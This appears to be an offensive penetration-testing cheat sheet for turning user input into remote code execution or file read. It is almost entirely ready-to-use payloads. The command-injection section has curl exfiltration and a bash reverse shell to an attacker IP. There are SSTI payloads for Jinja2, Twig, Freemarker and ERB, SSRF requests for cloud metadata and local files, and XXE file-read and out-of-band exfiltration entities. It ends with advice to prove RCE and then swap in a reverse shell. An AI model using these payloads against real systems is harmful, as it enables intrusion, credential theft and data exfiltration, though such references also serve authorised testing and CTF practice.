## Goal
Turn input that reaches a shell, template engine, XML parser, or URL-fetch into RCE or file read. Covers command injection, SSTI, SSRF, and XXE.

**Checklist**
- [ ] input passed to a system command? (ping, dns, convert, backup)
- [ ] user input reflected + template renders math? (SSTI)
- [ ] server parses XML you send? (XXE)
- [ ] server fetches a URL you control? (SSRF)

# Commands

### Command injection
```bash
# separators to append a command:  ; | & `` $()  %0a (newline)  %26 (&)
curl "http://$IP/ping?host=127.0.0.1;id"
# blind -> exfil:  ...;curl http://<YOUR_IP>/$(whoami)     time-based:  ...;sleep 5
# reverse shell:  ;bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1'
```

### SSTI (identify the engine, then RCE)
```bash
# detect: {{7*7}}->49 (Jinja2/Twig) | ${7*7}->49 (Freemarker/Velocity) | <%= 7*7 %>->49 (ERB)
# fingerprint polyglot:  ${{<%[%'"}}%\
# Jinja2 (Python/Flask):
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
# Twig (PHP):
{{ ['id']|filter('system') }}
# Freemarker (Java):
<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}
# ERB (Ruby):
<%= `id` %>
# Velocity (Java) -> use the Runtime gadget: searchsploit velocity ssti
```

### SSRF
```bash
curl "http://$IP/fetch?url=http://127.0.0.1:8080/"                     # reach internal service
curl "http://$IP/fetch?url=http://169.254.169.254/latest/meta-data/"  # cloud metadata
curl "http://$IP/fetch?url=file:///etc/passwd"                        # file scheme -> read files
# filter bypass: http://127.1 | http://0 | http://[::1] | decimal IP | http://target@evil
```

### XXE (XML external entity)
```bash
# where XML enters the app (SOAP, /api, upload of .xml/.docx/.svg). File read:
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY x SYSTEM "file:///etc/passwd"> ]>
<root><data>&x;</data></root>
# read PHP source (php filter avoids XML-breaking chars):
<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=index.php">
# blind/OOB (no reflected output) -> exfil via external DTD on your server:
<!DOCTYPE r [ <!ENTITY % d SYSTEM "http://<YOUR_IP>/evil.dtd"> %d; ]>
```

### Helpline
```bash
# HOW TO SPOT EACH:
#   cmd injection -> a field that runs a system tool (ping host, nslookup, image convert, backup
#     filename). test with ;id and watch for output or a delay (;sleep 5).
#   SSTI -> your input is reflected on the page; test {{7*7}} / ${7*7} — a "49" = vulnerable.
#     WHICH engine rendered it (see detect line) decides the payload -> {{ }} python, <#assign> java.
#   XXE -> ANY XML into the app (Content-Type application/xml, SOAP, .docx/.svg/.xml upload).
#   SSRF -> any url= / fetch= / img= / webhook / "import from URL" feature.
# ALWAYS prove RCE with id/whoami first, THEN swap in a reverse shell.
# blind everything -> exfil to your own HTTP/DNS listener: curl http://<YOU>/$(whoami)
```
